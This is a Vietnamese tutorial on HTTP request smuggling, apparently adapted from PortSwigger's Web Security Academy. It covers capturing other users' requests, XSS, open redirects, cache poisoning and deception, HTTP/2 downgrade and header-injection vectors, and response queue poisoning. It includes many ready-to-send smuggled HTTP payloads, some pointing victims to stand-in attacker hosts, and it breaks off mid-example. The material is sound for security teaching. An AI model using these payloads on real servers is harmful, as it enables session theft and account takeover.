Nếu ứng dụng chứa bất kỳ chức năng nào cho phép bạn lưu trữ và sau đó truy xuất dữ liệu dạng văn bản, bạn có thể sử dụng điều này để thu thập nội dung của các yêu cầu do người dùng khác gửi. Những nội dung này có thể bao gồm token phiên hoặc các dữ liệu nhạy cảm khác do người dùng gửi lên. Các chức năng thích hợp để làm phương tiện cho cuộc tấn công này có thể là phần bình luận, email, mô tả hồ sơ, tên hiển thị, v.v.

Để thực hiện cuộc tấn công, bạn cần tuồn một yêu cầu gửi dữ liệu tới chức năng lưu trữ, với tham số chứa dữ liệu cần lưu được đặt ở cuối yêu cầu. Ví dụ, giả sử một ứng dụng dùng yêu cầu sau để gửi một bình luận bài blog, bình luận này sẽ được lưu và hiển thị trên blog:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

Bây giờ hãy xem điều gì sẽ xảy ra nếu bạn tuồn một yêu cầu tương đương với header `Content-Length` dài quá mức và tham số comment được đặt ở cuối yêu cầu như sau:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

Header `Content-Length` của yêu cầu bị tuồn cho biết body sẽ dài 400 byte, nhưng chúng ta chỉ gửi 144 byte. Trong trường hợp này, máy chủ phía sau (back-end) sẽ đợi thêm 256 byte còn lại trước khi trả về phản hồi, hoặc sẽ phát sinh timeout nếu phần này không đến kịp. Kết quả là, khi một yêu cầu khác được gửi đến máy chủ phía sau trên cùng một kết nối, 256 byte đầu tiên thực tế sẽ bị ghép nối vào yêu cầu bị tuồn như sau:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

Vì phần bắt đầu của yêu cầu nạn nhân nằm trong tham số comment, điều này sẽ bị đăng làm một bình luận trên blog, cho phép bạn đọc nó đơn giản bằng cách truy cập vào bài đăng liên quan.

Để thu thập nhiều nội dung hơn từ yêu cầu của nạn nhân, bạn chỉ cần tăng giá trị header Content-Length của yêu cầu bị tuồn tương ứng, nhưng lưu ý rằng việc này sẽ cần một quá trình thử và sai nhất định. Nếu bạn gặp timeout, có khả năng Content-Length bạn chỉ định lớn hơn độ dài thực tế của yêu cầu nạn nhân. Trong trường hợp đó, chỉ cần giảm giá trị cho đến khi cuộc tấn công hoạt động trở lại.

> **Lưu ý**
> 
> Một hạn chế của kỹ thuật này là nó thường chỉ thu thập dữ liệu cho tới bộ phân cách tham số áp dụng cho yêu cầu bị tuồn. Đối với việc gửi form được mã hóa dạng URL, đó sẽ là ký tự `&`, có nghĩa là nội dung được lưu lại từ yêu cầu của người dùng nạn nhân sẽ kết thúc tại ký tự `&` đầu tiên, ký tự này thậm chí có thể xuất hiện trong query string.

## XSS

Nếu một ứng dụng bị lỗi HTTP request smuggling và cũng chứa reflected XSS, bạn có thể sử dụng một cuộc tấn công tuồn yêu cầu để tác động tới những người dùng khác của ứng dụng. Cách tiếp cận này vượt trội so với khai thác reflected XSS thông thường ở hai điểm:

- Nó không yêu cầu tương tác với người dùng nạn nhân. Bạn không cần gửi họ một URL rồi chờ họ truy cập. Bạn chỉ cần tuồn một yêu cầu chứa payload XSS và yêu cầu của người dùng kế tiếp được xử lý bởi máy chủ phía sau sẽ bị ảnh hưởng.
- Nó có thể được dùng để khai thác hành vi XSS ở những phần của yêu cầu mà không thể dễ dàng kiểm soát trong một cuộc tấn công reflected XSS thông thường, chẳng hạn như các header HTTP.

Ví dụ, giả sử một ứng dụng có lỗ hổng reflected XSS trong header User-Agent. Bạn có thể khai thác điều này trong một cuộc tấn công tuồn yêu cầu như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

Yêu cầu của người dùng kế tiếp sẽ được ghép vào yêu cầu bị tuồn, và họ sẽ nhận được payload XSS được phản chiếu trong phản hồi.
## On-site → Open

Nhiều ứng dụng thực hiện chuyển hướng nội bộ từ một URL này sang URL khác và đưa hostname từ header Host của yêu cầu vào URL chuyển hướng. Một ví dụ của điều này là hành vi mặc định của máy chủ web Apache và IIS, nơi một yêu cầu cho một thư mục thiếu dấu gạch chéo ở cuối sẽ nhận được chuyển hướng tới cùng thư mục với dấu gạch chéo ở cuối:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: <https://normal-website.com/home/>
```

Hành vi này thường được coi là vô hại, nhưng nó có thể bị lợi dụng trong một cuộc tấn công tuồn yêu cầu để chuyển hướng những người dùng khác tới một domain bên ngoài. Ví dụ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

Yêu cầu bị tuồn sẽ kích hoạt một chuyển hướng tới website của kẻ tấn công, điều này sẽ ảnh hưởng tới yêu cầu của người dùng tiếp theo được xử lý bởi máy chủ phía sau. Ví dụ:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: <https://attacker-website.com/home/>
```

Tại đây, yêu cầu của người dùng là yêu cầu một file JavaScript được import bởi một trang trên website. Kẻ tấn công có thể hoàn toàn thỏa hiệp người dùng nạn nhân bằng cách trả về JavaScript do mình cung cấp trong phản hồi.
### Root-relative → Open

Trong một số trường hợp, bạn có thể gặp những chuyển hướng ở cấp máy chủ (server-level redirects) dùng đường dẫn để dựng URL tương đối gốc cho header `Location`, ví dụ:

```
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

Điều này vẫn có thể bị lợi dụng thành một chuyển hướng mở (open redirect) nếu máy chủ cho phép bạn sử dụng URL tương đối theo giao thức (protocol-relative URL) trong phần đường dẫn:

```
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

## Web cache Poisoning

Trong một biến thể của cuộc tấn công trước đó, có thể lợi dụng HTTP request smuggling để thực hiện một cuộc tấn công đầu độc bộ nhớ đệm web (web cache poisoning). Nếu bất kỳ phần nào của hạ tầng phía trước (front-end) thực hiện việc cache nội dung (thường vì lý do hiệu năng), thì có thể đầu độc cache bằng phản hồi chuyển hướng tới ngoài site. Điều này sẽ khiến cuộc tấn công trở nên bền vững, ảnh hưởng tới bất kỳ người dùng nào sau đó yêu cầu URL bị ảnh hưởng.

Trong biến thể này, kẻ tấn công gửi tất cả các nội dung sau tới máy chủ front-end:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

Yêu cầu bị tuồn sẽ tới máy chủ back-end, server back-end phản hồi như trước với chuyển hướng ra ngoài site. Máy chủ front-end sẽ lưu phản hồi này vào cache tương ứng với URL mà nó tin là của yêu cầu thứ hai, đó là `/static/include.js`:

```
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: <https://attacker-website.com/home/>
```

Từ thời điểm này trở đi, khi những người dùng khác yêu cầu URL này, họ sẽ nhận được chuyển hướng tới website của kẻ tấn công.

## Web cache Deception


Trong một biến thể khác của cuộc tấn công, bạn có thể lợi dụng HTTP request smuggling để thực hiện **web cache deception**. Cách này hoạt động tương tự như cuộc tấn công web cache poisoning nhưng với mục đích khác.

Sự khác biệt giữa web cache poisoning và web cache deception là gì?

- Trong **web cache poisoning**, kẻ tấn công khiến ứng dụng lưu một số nội dung độc hại vào bộ nhớ đệm, và nội dung này được phục vụ từ cache cho các người dùng khác của ứng dụng.
- Trong **web cache deception**, kẻ tấn công khiến ứng dụng lưu một số nội dung nhạy cảm thuộc về người dùng khác vào bộ nhớ đệm, rồi kẻ tấn công sau đó truy xuất nội dung này từ cache.

Trong biến thể này, kẻ tấn công tuồn một yêu cầu trả về một số nội dung nhạy cảm theo phiên của người dùng. Ví dụ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

Yêu cầu tiếp theo từ một người dùng khác được chuyển tiếp tới server back-end sẽ bị ghép vào yêu cầu bị tuồn, bao gồm cookie phiên và các header khác. Ví dụ:

```
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

Server back-end phản hồi yêu cầu này như bình thường. URL trong yêu cầu là cho trang tin nhắn riêng tư của người dùng và yêu cầu được xử lý trong ngữ cảnh phiên của nạn nhân. Server front-end sẽ lưu phản hồi này vào cache theo URL mà nó tin là của yêu cầu thứ hai, đó là `/static/some-image.png`:

```
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

Kẻ tấn công sau đó truy cập URL tĩnh và nhận được nội dung nhạy cảm được trả về từ cache.

Một lưu ý quan trọng ở đây là kẻ tấn công không biết trước URL mà nội dung nhạy cảm sẽ được cache vào, vì đó sẽ là URL mà nạn nhân vô tình đang yêu cầu khi yêu cầu bị tuồn có hiệu lực. Kẻ tấn công có thể cần phải truy vấn một số lượng lớn các URL tĩnh để khám phá nội dung bị bắt giữ.
# Xâm nhập nâng cao

Trong phần này, chúng ta sẽ xây dựng trên các khái niệm bạn đã học được cho đến nay và hướng dẫn bạn một số kỹ thuật HTTP request smuggling nâng cao hơn. Chúng tôi cũng sẽ đề cập đến nhiều loại tấn công dựa trên HTTP/2 mà trở nên khả thi nhờ vào khả năng kiểm thử HTTP/2 độc đáo của Burp. Đừng lo nếu bạn mới làm quen với HTTP/2 - chúng tôi sẽ trình bày tất cả những kiến thức cơ bản khi tiến hành.

Cụ thể, chúng ta sẽ xem xét:

- Cách các triển khai HTTP/2 phổ biến mở ra một loạt vector tấn công mạnh mẽ mới cho request smuggling, khiến nhiều trang trước đây được coi là an toàn trở nên dễ bị tổn thương trước những kiểu tấn công này.
- Cách bạn có thể sử dụng request smuggling để đầu độc hàng đợi phản hồi một cách dai dẳng, từ đó về thực tế cho phép chiếm quyền kiểm soát toàn bộ trang.
- Cách bạn có thể dùng các đầu vào chỉ có trong HTTP/2 để xây dựng những exploit có mức độ nghiêm trọng cao ngay cả khi mục tiêu không tái sử dụng kết nối giữa máy chủ front-end và back-end chút nào.

Để giúp bạn thực hành những gì đã học, chúng tôi đã cung cấp các lab cố tình dễ bị tấn công xuyên suốt. Những lab này dựa trên các lỗ hổng thực tế được trình bày lần đầu tại Black Hat USA 2021 bởi Giám đốc Nghiên cứu của chúng tôi, James Kettle.
## HTTP/2

Trong phần này, chúng tôi sẽ cho bạn thấy rằng, trái với quan niệm phổ biến, việc triển khai HTTP/2 thực ra đã khiến nhiều trang web dễ bị **request smuggling** hơn, ngay cả khi trước đó chúng được coi là an toàn trước các kiểu tấn công này.
### Message length

Tuồn yêu cầu (request smuggling) về bản chất là lợi dụng sự khác biệt giữa cách các máy chủ khác nhau diễn giải độ dài của một yêu cầu. HTTP/2 giới thiệu một cơ chế duy nhất và vững chắc để xử lý việc này, cơ chế mà từ lâu người ta cho là khiến HTTP/2 về bản chất miễn nhiễm với tuồn yêu cầu.

Mặc dù bạn sẽ không thấy điều này trong Burp, các thông điệp HTTP/2 được gửi trên đường dây dưới dạng một chuỗi các “frame” tách biệt. Mỗi frame được dẫn trước bởi một trường độ dài rõ ràng, cho server biết chính xác có bao nhiêu byte cần đọc. Do đó, độ dài của yêu cầu là tổng các độ dài của các frame.

Về lý thuyết, cơ chế này có nghĩa là không có cơ hội cho kẻ tấn công tạo ra sự mơ hồ cần thiết cho tuồn yêu cầu, miễn là website sử dụng HTTP/2 end-to-end. Trong thực tế hoang dã, tuy nhiên, điều này thường không đúng do thực hành phổ biến nhưng nguy hiểm là hạ cấp HTTP/2 (HTTP/2 downgrading).
### **HTTP/2 downgrading**

Vì HTTP/2 vẫn còn tương đối mới, các máy chủ web hỗ trợ nó thường vẫn phải giao tiếp với hạ tầng back-end kế thừa chỉ “nói” HTTP/1. Do đó, việc các máy chủ front-end chuyển đổi (rewrite) mỗi yêu cầu HTTP/2 đến sang cú pháp HTTP/1 - thực chất sinh ra phiên bản tương đương HTTP/1 - đã trở thành thực hành phổ biến. Yêu cầu bị “hạ cấp” (downgraded) này sau đó được chuyển tiếp tới máy chủ back-end tương ứng.

![image.png](attachment:3ff1117e-b8a9-49a4-bf79-dca0b5f04896:image.png)

Khi back-end chỉ hỗ trợ HTTP/1 trả về phản hồi, máy chủ front-end sẽ đảo ngược quá trình này để sinh phản hồi HTTP/2 trả về cho client.

Điều này hoạt động vì mỗi phiên bản giao thức về cơ bản chỉ là một cách khác nhau để biểu diễn cùng một thông tin. Mỗi mục trong một thông điệp HTTP/1 đều có một tương đương xấp xỉ trong HTTP/2.

![image.png](attachment:e74bf363-2507-4810-82e5-ccf7b07250e5:image.png)

Kết quả là, việc các máy chủ chuyển đổi các yêu cầu và phản hồi giữa hai giao thức tương đối đơn giản. Thực tế, chính cách này cho phép Burp hiển thị các thông điệp HTTP/2 trong trình soạn thảo bằng cú pháp HTTP/1.

Việc hạ cấp HTTP/2 (HTTP/2 downgrading) rất phổ biến và thậm chí là hành vi mặc định của một số dịch vụ reverse-proxy phổ biến. Trong một số trường hợp, thậm chí không có tùy chọn để tắt nó.

> Những rủi ro liên quan đến hạ cấp HTTP/2 là gì?

Hạ cấp HTTP/2 có thể phơi bày các website trước các cuộc tấn công tuồn yêu cầu (request smuggling), mặc dù HTTP/2 tự nó thường được coi là miễn nhiễm khi được sử dụng end-to-end.

Cơ chế độ dài tích hợp của HTTP/2 có nghĩa là, khi sử dụng hạ cấp HTTP, có thể tồn tại ba cách khác nhau để chỉ định độ dài của cùng một yêu cầu - và đây chính là cơ sở của tất cả các cuộc tấn công tuồn yêu cầu.

---

### [H2.CL](http://H2.CL)

---

Yêu cầu HTTP/2 không bắt buộc phải chỉ định độ dài một cách tường minh trong header. Khi hạ cấp, điều này có nghĩa là các máy chủ front-end thường thêm header `Content-Length` theo HTTP/1, suy ra giá trị của nó bằng cơ chế độ dài tích hợp của HTTP/2. Thú vị là, yêu cầu HTTP/2 cũng có thể chứa chính header `content-length` của riêng nó. Trong trường hợp này, một số máy chủ front-end sẽ đơn giản tái sử dụng giá trị này trong yêu cầu HTTP/1 đầu ra.

Tiêu chuẩn quy định rằng bất kỳ header `content-length` nào trong yêu cầu HTTP/2 phải khớp với độ dài được tính bằng cơ chế tích hợp, nhưng điều này không phải lúc nào cũng được kiểm tra đúng trước khi hạ cấp. Do đó, có thể tuồn yêu cầu bằng cách chèn một header `content-length` gây hiểu lầm. Mặc dù front-end sẽ sử dụng độ dài ẩn của HTTP/2 để xác định điểm kết thúc của yêu cầu, back-end HTTP/1 buộc phải tham chiếu header `Content-Length` được sinh ra từ header bạn chèn, dẫn đến không đồng bộ (desync).

> Front-end (HTTP/2)

```
	  		:method	POST
  				:path	/example
  	 :authority	vulnerable-website.com
   content-type	application/x-www-form-urlencoded
 content-length	0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

> Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

> Mẹo
> 
> Khi thực hiện một số cuộc tấn công request smuggling, bạn sẽ muốn các header từ yêu cầu nạn nhân được ghép vào phần tiền tố (prefix) bạn tuồn. Tuy nhiên, những header này có thể cản trở cuộc tấn công trong một số trường hợp, dẫn đến lỗi header trùng lặp và tương tự. Trong ví dụ ở trên, chúng tôi đã giảm thiểu điều này bằng cách bao gồm một tham số kết thúc và một header `Content-Length` trong phần tiền tố bị tuồn. Bằng cách sử dụng một header `Content-Length` dài hơn một chút so với body, yêu cầu của nạn nhân vẫn sẽ được ghép vào phần tiền tố của bạn nhưng sẽ bị cắt ngắn trước khi xuất hiện các header.

[Lab: H2.CL request smuggling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

---

### H2.TE

---

Chunked transfer encoding không tương thích với HTTP/2 và đặc tả khuyến nghị rằng bất kỳ header `transfer-encoding: chunked` nào bạn cố gắng chèn nên bị loại bỏ hoặc yêu cầu phải bị chặn hoàn toàn. Nếu máy chủ front-end không thực hiện điều này, và sau đó hạ cấp yêu cầu cho một back-end HTTP/1 hỗ trợ chunked encoding, điều này cũng có thể cho phép các cuộc tấn công request smuggling.

> Front-end (HTTP/2)

```
					 :method	POST
						 :path	/example
				:authority	vulnerable-website.com
			content-type	application/x-www-form-urlencoded
 transfer-encoding	chunked
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

> Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Nếu một website dễ bị tấn công bởi request smuggling theo kiểu [H2.CL](http://H2.CL) hoặc H2.TE, bạn có thể tận dụng hành vi này để thực hiện cùng những cuộc tấn công mà chúng tôi đã trình bày trong các lab request smuggling trước đó.

---

### HTTP/2 ẩn

---

Trình duyệt và các client khác, bao gồm cả Burp, thường chỉ sử dụng HTTP/2 để giao tiếp với các máy chủ mà rõ ràng quảng bá hỗ trợ nó thông qua ALPN trong quá trình bắt tay TLS.

Một số máy chủ hỗ trợ HTTP/2 nhưng lại không khai báo đúng do cấu hình sai. Trong những trường hợp như vậy, có vẻ như máy chủ chỉ hỗ trợ HTTP/1.1 vì client mặc định sẽ dùng HTTP/1.1 như tùy chọn dự phòng. Hệ quả là, người kiểm thử có thể bỏ sót bề mặt tấn công HTTP/2 khả thi và không phát hiện các vấn đề ở cấp giao thức, như các ví dụ về request smuggling dựa trên hạ cấp HTTP/2 mà chúng ta đã đề cập ở trên.

Để ép Burp Repeater sử dụng HTTP/2 để bạn có thể kiểm tra lỗi cấu hình này bằng tay:

1. Từ hộp thoại **Settings**, vào **Tools > Repeater**.
2. Dưới **Connections**, bật tùy chọn **Allow HTTP/2 ALPN override**.
3. Trong Repeater, vào panel **Inspector** và mở rộng phần **Request attributes**.
4. Dùng công tắc để đặt **Protocol** thành **HTTP/2**. Burp giờ sẽ gửi tất cả các yêu cầu trên tab này sử dụng HTTP/2, bất kể máy chủ có tuyên bố hỗ trợ hay không.

> **Lưu ý**
> 
> Nếu bạn đang dùng Burp Suite Professional, Burp Scanner sẽ tự động phát hiện các trường hợp hỗ trợ HTTP/2 ẩn.

---

### **HTTP/2-exclusive vectors**

---

Do HTTP/2 là một giao thức nhị phân chứ không phải dựa trên văn bản, nên tồn tại một số vector khả dĩ mà không thể xây dựng được trong HTTP/1 vì hạn chế của cú pháp.

Chúng ta đã thấy cách bạn có thể chèn các chuỗi CRLF vào giá trị header. Trong phần này, chúng tôi sẽ đưa ra ý tưởng về một vài vector độc quyền khác của HTTP/2 mà bạn có thể dùng để chèn payload. Mặc dù các loại yêu cầu này về mặt chính thức bị cấm theo đặc tả HTTP/2, một số máy chủ vẫn không kiểm tra và chặn chúng hiệu quả.

> **Lưu ý** Chỉ có thể thực hiện những cuộc tấn công này bằng cách sử dụng các tính năng HTTP/2 chuyên dụng trong panel Inspector của Burp.

---

Chèn qua tên header

---

Trong HTTP/1, tên header không thể chứa dấu hai chấm vì ký tự này được dùng để chỉ kết thúc tên cho bộ phân tích. HTTP/2 thì không như vậy.

Bằng cách kết hợp dấu hai chấm với các ký tự `\\r\\n`, bạn có thể dùng trường tên của một header HTTP/2 để lén đưa các header khác vượt qua bộ lọc phía front-end. Những header này sau đó sẽ được hiểu là các header riêng biệt ở back-end khi yêu cầu được chuyển đổi sang cú pháp HTTP/1:

> Front-end (HTTP/2)

```
foo: bar\\r\\nTransfer-Encoding: chunked\\r\\nX:	ignore
```

> Back-end (HTTP/1)

```
Foo: bar\\r\\n
Transfer-Encoding: chunked\\r\\n
X: ignore\\r\\n
```

---

Chèn qua pseudo-header

---

HTTP/2 không sử dụng dòng yêu cầu (request line) hoặc dòng trạng thái (status line). Thay vào đó, những thông tin này được truyền qua một loạt "pseudo-header" ở phần đầu của yêu cầu. Trong các biểu diễn dạng văn bản của thông điệp HTTP/2, các pseudo-header này thường được tiền tố bằng dấu hai chấm để phân biệt với các header thông thường. Tổng cộng có năm pseudo-header:

- `:method` - Phương thức yêu cầu.
- `:path` - Đường dẫn yêu cầu. Lưu ý rằng trường này bao gồm cả query string.
- `:authority` - Tương đương gần đúng với header `Host` trong HTTP/1.
- `:scheme` - Giao thức (scheme) của yêu cầu, thường là `http` hoặc `https`.
- `:status` - Mã trạng thái phản hồi (không dùng trong yêu cầu).

Khi các website hạ cấp yêu cầu xuống HTTP/1, chúng sử dụng giá trị của một số pseudo-header này để động tạo dòng yêu cầu (request line). Điều này mở ra một vài cách mới, thú vị để cấu thành các cuộc tấn công.

---

Cung cấp host mơ hồ

---

Mặc dù header `Host` của HTTP/1 về cơ bản được thay bằng pseudo-header `:authority` trong HTTP/2, bạn vẫn được phép gửi một header `Host` trong yêu cầu.

Trong một số trường hợp, điều này có thể dẫn đến việc xuất hiện hai header `Host` trong yêu cầu HTTP/1 sau khi được chuyển đổi, điều này mở ra khả năng vượt qua các bộ lọc phía front-end kiểm tra “header Host trùng lặp”, ví dụ. Điều này có thể khiến trang web trở nên dễ bị một loạt các tấn công liên quan đến Host header mà trước đó có thể nó miễn nhiễm.

---

Cung cấp path mơ hồ

---

Cố gắng gửi một yêu cầu với đường dẫn mơ hồ là không thể trong HTTP/1 do cách phân tích dòng yêu cầu. Nhưng vì đường dẫn trong HTTP/2 được chỉ định bằng một pseudo-header, giờ đây có thể gửi một yêu cầu với hai đường dẫn khác nhau như sau:

```
:method	POST
:path	/anything
:path	/admin
:authority	vulnerable-website.com
```

Nếu tồn tại sự không nhất quán giữa đường dẫn mà các cơ chế kiểm soát truy cập của website xác thực và đường dẫn được dùng để định tuyến yêu cầu, điều này có thể cho phép bạn truy cập các endpoint mà lẽ ra bị cấm.

---

Chèn cả dòng yêu cầu

---

Trong quá trình hạ cấp, giá trị của pseudo-header `:method` sẽ được ghi vào ngay phần đầu của yêu cầu HTTP/1 kết quả. Nếu máy chủ cho phép bạn bao gồm dấu cách trong giá trị `:method`, bạn có thể chèn hoàn toàn một dòng yêu cầu khác như sau:

Front-end (HTTP/2)

```
:method	GET /admin HTTP/1.1
:path	/anything
:authority	vulnerable-website.com
```

Back-end (HTTP/1)

```
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

Miễn là máy chủ cũng chịu được các ký tự tùy ý xuất hiện phía sau trong dòng yêu cầu, điều này cung cấp một phương thức khác để tạo một yêu cầu có đường dẫn mơ hồ.

---

Chèn tiền tố URL

---

Một tính năng thú vị khác của HTTP/2 là khả năng chỉ định rõ **scheme** trong chính yêu cầu bằng pseudo-header `:scheme`. Mặc dù thường thì trường này chỉ chứa `http` hoặc `https`, bạn có thể có khả năng đưa vào các giá trị tùy ý.

Điều này hữu ích khi server sử dụng header `:scheme` để động tạo URL, ví dụ. Trong trường hợp đó, bạn có thể thêm một tiền tố vào URL hoặc thậm chí ghi đè hoàn toàn bằng cách đẩy URL thật vào query string:

> Yêu cầu

```
:method	GET
:path	/anything
:authority	vulnerable-website.com
:scheme	<https://evil-user.net/poison>?
```

> Phản hồi

```
:status	301
location	<https://evil-user.net/poison?://vulnerable-website.com/anything/>
```

---

Chèn ký tự xuống dòng vào pseudo-header

---

Khi chèn vào pseudo-header `:path` hoặc `:method`, bạn cần đảm bảo rằng yêu cầu HTTP/1 kết quả vẫn có một dòng yêu cầu hợp lệ.

Vì `\\r\\n` kết thúc dòng yêu cầu trong HTTP/1, đơn giản chèn `\\r\\n` giữa chừng sẽ phá vỡ yêu cầu. Sau khi hạ cấp, yêu cầu được viết lại phải chứa chuỗi sau trước `\\r\\n` đầu tiên mà bạn chèn:

```
<method> + space + <path> + space + HTTP/1.1
```

Chỉ cần hình dung nơi chèn của bạn nằm trong chuỗi này và bao gồm tất cả các phần còn lại tương ứng. Ví dụ, khi chèn vào `:path`, bạn cần thêm một dấu cách và `HTTP/1.1` trước `\\r\\n` như sau:

> Front-end (HTTP/2)

```
:method	GET
:path
/example HTTP/1.1\\r\\n
Transfer-Encoding: chunked\\r\\n
X: x

:authority	vulnerable-website.com
```

> Back-end (HTTP/1)

```
GET /example HTTP/1.1\\r\\n
Transfer-Encoding: chunked\\r\\n
X: x HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
```

Lưu ý rằng trong trường hợp này, chúng tôi cũng đã thêm một header tùy ý phía sau để bắt lấy dấu cách và giao thức đã được thêm tự động trong quá trình viết lại.

---

## **Response queue**

---

Đầu độc hàng đợi phản hồi (response queue poisoning) là một dạng tấn công **request smuggling** mạnh mẽ khiến máy chủ front-end bắt đầu ánh xạ các phản hồi từ back-end sang những yêu cầu sai. Trên thực tế, điều này có nghĩa là mọi người dùng dùng chung cùng một kết nối front-end/back-end sẽ liên tục nhận được các phản hồi vốn được gửi cho người khác.

Kỹ thuật này được thực hiện bằng cách tuồn (smuggle) một yêu cầu hoàn chỉnh, khiến back-end trả về hai phản hồi trong khi máy chủ front-end chỉ đang mong đợi một phản hồi.

---

### Hậu quả

---

Tác động của đầu độc hàng đợi phản hồi thường là thảm khốc. Một khi hàng đợi bị đầu độc, kẻ tấn công có thể thu thập được các phản hồi của người dùng khác chỉ bằng cách gửi các yêu cầu theo sau tùy ý. Những phản hồi này có thể chứa dữ liệu cá nhân hoặc thông tin doanh nghiệp nhạy cảm, cũng như token phiên và các thông tin tương tự, từ đó kẻ tấn công về cơ bản có được quyền truy cập đầy đủ vào tài khoản của nạn nhân.

Đầu độc hàng đợi phản hồi cũng gây ra thiệt hại phụ đáng kể, về cơ bản làm hỏng trang đối với bất kỳ người dùng nào có lưu lượng được gửi tới back-end qua cùng một kết nối TCP. Khi cố gắng duyệt site như bình thường, người dùng sẽ nhận các phản hồi trông như ngẫu nhiên từ server, khiến hầu hết chức năng không hoạt động đúng.

---

### Xây dựng cuộc tấn công

---

Để một cuộc tấn công đầu độc hàng đợi phản hồi thành công, các tiêu chí sau đây phải được thỏa mãn:

- Kết nối TCP giữa máy chủ front-end và máy chủ back-end được tái sử dụng cho nhiều chu trình yêu cầu/ phản hồi.
- Kẻ tấn công có khả năng tuồn một yêu cầu hoàn chỉnh, độc lập sao cho yêu cầu đó nhận được một phản hồi riêng biệt từ máy chủ back-end.
- Cuộc tấn công không khiến bất kỳ máy chủ nào đóng kết nối TCP. Các máy chủ thường đóng các kết nối đến khi nhận được một yêu cầu không hợp lệ vì họ không thể xác định nơi yêu cầu đó kết thúc.

---

Hiểu hậu quả sau khi tuồn yêu cầu

---

Các cuộc tấn công tuồn yêu cầu thường liên quan đến việc tuồn một yêu cầu **một phần**, mà server sẽ thêm làm **tiền tố** vào phần bắt đầu của yêu cầu tiếp theo trên cùng một kết nối. Điều quan trọng cần lưu ý là **nội dung** của yêu cầu bị tuồn ảnh hưởng đến những gì xảy ra với kết nối sau cuộc tấn công ban đầu.

Nếu bạn chỉ tuồn một dòng yêu cầu kèm vài header, giả sử rằng một yêu cầu khác sẽ được gửi trên kết nối ngay sau đó, thì về cuối cùng back-end vẫn sẽ nhận hai yêu cầu hoàn chỉnh.

![image.png](attachment:07089007-7656-46ca-ba0a-dc4075f19cc7:image.png)

Nếu thay vào đó bạn tuồn một yêu cầu có **phần thân (body)**, thì yêu cầu tiếp theo trên kết nối sẽ bị **ghép vào phần thân** của yêu cầu bị tuồn. Điều này thường có tác dụng làm **cắt ngắn** yêu cầu cuối cùng dựa trên giá trị `Content-Length` xuất hiện. Kết quả là, back-end thực tế sẽ thấy ba yêu cầu, trong đó yêu cầu thứ ba chỉ là một chuỗi các byte thừa:

> Front-end (CL)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

> Back-end (TE)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
